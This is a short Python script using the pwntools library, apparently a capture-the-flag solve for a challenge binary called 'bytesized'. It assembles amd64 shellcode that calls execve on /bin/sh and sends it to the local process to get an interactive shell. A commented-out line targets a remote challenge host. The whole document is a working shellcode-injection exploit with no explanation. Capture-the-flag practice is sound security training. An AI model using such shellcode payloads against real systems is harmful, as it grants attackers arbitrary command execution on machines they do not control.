from pwn import *

io = process("./bytesized")
#io = remote("15.206.149.154", 30012)
context.log_level = 'debug' 
context.arch = "amd64"

payload = asm('''mov rax, 59
lea rdi, [rip+binsh]
mov rsi, 0
mov rdx, 0
syscall
binsh:
    .string "/bin/sh"
''')

io.recvuntil("es)==>\n")
io.sendline(payload)
io.interactive()
